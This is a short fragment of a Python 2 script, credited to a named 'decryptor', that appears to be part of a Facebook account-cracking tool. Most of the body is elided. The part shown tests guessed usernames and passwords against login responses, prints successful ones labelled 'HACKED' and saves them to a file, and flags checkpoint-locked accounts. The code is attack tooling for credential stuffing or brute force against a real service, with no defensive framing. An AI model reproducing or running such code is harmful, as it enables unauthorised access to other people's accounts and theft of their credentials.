# DECRYPTED BY RASHED HOSSAIN
# Github : https://github.com/RASHED-HOSSAIN
 #!/usr/bin/python
# -*- coding: utf-8
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[RASHED-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[RASHED-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m                   [Open After 7 Days]\x1b[0m \n'
